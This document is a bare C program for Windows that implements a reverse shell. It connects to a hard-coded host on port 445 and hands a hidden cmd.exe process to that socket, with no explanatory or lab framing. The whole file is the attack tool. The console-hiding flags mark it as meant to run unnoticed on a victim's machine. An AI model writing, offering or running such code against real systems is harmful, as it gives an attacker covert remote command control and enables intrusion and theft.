#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>

#define SERVER "192.168.0.3"
#define PORT 445

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    // Initialize Winsock library
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        perror("Error initializing winsock");
        exit(EXIT_FAILURE);
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
        perror("Error creating socket");
        closesocket(sock);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    server.sin_addr.s_addr = inet_addr(SERVER);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
        perror("Connection error");
        closesocket(sock);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else {
        printf("Connected to %s:%d\n", SERVER, PORT);
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide console window
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    char *cmd[] = { "cmd.exe", NULL };

    // Start cmd.exe in another process
    if (!CreateProcess(NULL, cmd[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        perror("Error starting cmd.exe process");
        closesocket(sock);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    // Close process and thread handles
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Cleanup
    closesocket(sock);
    WSACleanup();

    return 0;
}